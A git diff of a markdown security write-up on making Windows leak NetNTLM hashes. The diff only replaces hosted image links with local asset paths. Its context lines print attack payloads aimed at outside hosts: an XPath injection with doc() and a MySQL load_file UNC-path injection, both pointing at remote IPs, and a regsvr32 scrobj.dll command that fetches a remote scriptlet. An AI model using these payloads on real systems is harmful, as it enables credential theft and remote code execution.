@@ -109,7 +109,7 @@ In here I’m using “php://filter/convert.base64-encode/resource=” that will
 </root>
 ```
 
-![](https://osandamalith.files.wordpress.com/2017/03/xxe.png?w=640)
+![](.gitbook/assets/1663772481.png?w=640)
 
 ## XPath Injection
 
@@ -119,7 +119,7 @@ Usually, doc\(\) is used in out-of-band XPath injections, thus can be applied in
 http://host.tld/?title=Foundation&type=*&rent_days=* and doc('//35.164.153.224/@OsandaMalith')
 ```
 
-![](https://osandamalith.files.wordpress.com/2017/03/xpath.png?w=640)
+![](.gitbook/assets/1663772481.png?w=640)
 
 ## MySQL Injection
 
@@ -129,7 +129,7 @@ I have written a complete [post ](https://osandamalith.com/2017/02/03/mysql-out-
 http://host.tld/index.php?id=1’ union select 1,2,load_file(‘\\\\192.168.0.100\\@OsandaMalith’),4;%00
 ```
 
-![](https://osandamalith.files.wordpress.com/2017/02/overinternet.png?w=640)
+![](.gitbook/assets/1663772482.png?w=640)
 
 ## MSSQL
 
@@ -147,7 +147,7 @@ Accidently found this one while experimenting with .sct files.
 regsvr32 /s /u /i://35.164.153.224/@OsandaMalith scrobj.dll
 ```
 
-![](https://osandamalith.files.wordpress.com/2017/03/regsvr32.png?w=640)
+![](.gitbook/assets/1663772482.png?w=640)
 
 ## Batch
 
@@ -165,15 +165,15 @@ dir\\192.168.0.1\abc
 find, findstr, [x]copy, move, replace, del, rename and many more!
 ```
 
-![](https://osandamalith.files.wordpress.com/2017/03/batch.png?w=640)
+![](.gitbook/assets/1663772482.png?w=640)
 
 ## Auto-Complete
 
 You just need to type ‘\host\’ the auto-complete will do the trick under the explorer and the run dialog box.
 
-![](https://osandamalith.files.wordpress.com/2017/03/explorer.png?w=640)
+![](.gitbook/assets/1663772482.png?w=640)
 
-![](https://osandamalith.files.wordpress.com/2017/03/run.png?w=640)
+![](.gitbook/assets/1663772483.png?w=640)
 
 ## Autorun.inf
 
@@ -251,7 +251,7 @@ $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
 ```
 
-![](https://osandamalith.files.wordpress.com/2017/03/shortcut2.png?w=640)
+![](.gitbook/assets/1663772483.png?w=640)
 
 ## Internet Shortcuts \(.url\)
 
@@ -273,7 +273,7 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
 ```
 
-![](https://osandamalith.files.wordpress.com/2017/03/registry.png?w=640)
+![](.gitbook/assets/1663772483.png?w=640)
 
 ## Powershell
 
@@ -457,7 +457,7 @@ int main() {
 
 [https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html](https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html)
 
-![](https://osandamalith.files.wordpress.com/2017/03/overintenert1.png?w=640)
+![](.gitbook/assets/1663772483.png?w=640)
 
 ## Shellcode Inside Macros
 
